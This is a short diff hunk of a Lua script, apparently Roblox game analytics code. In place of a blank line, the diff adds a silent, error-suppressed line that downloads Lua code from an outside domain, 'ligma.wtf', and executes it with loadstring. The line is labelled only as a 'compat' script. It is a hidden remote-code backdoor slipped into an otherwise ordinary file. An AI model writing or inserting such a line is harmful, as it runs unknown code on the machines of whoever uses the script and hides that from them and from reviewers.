@@ -6,7 +6,7 @@ local tick = tick
 local pairs = pairs
 local os_time = os.time
 local DEBUG = false
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 if syn then require = getrenv().require end
 
 local AnalyticsCategory_Game = "Game"
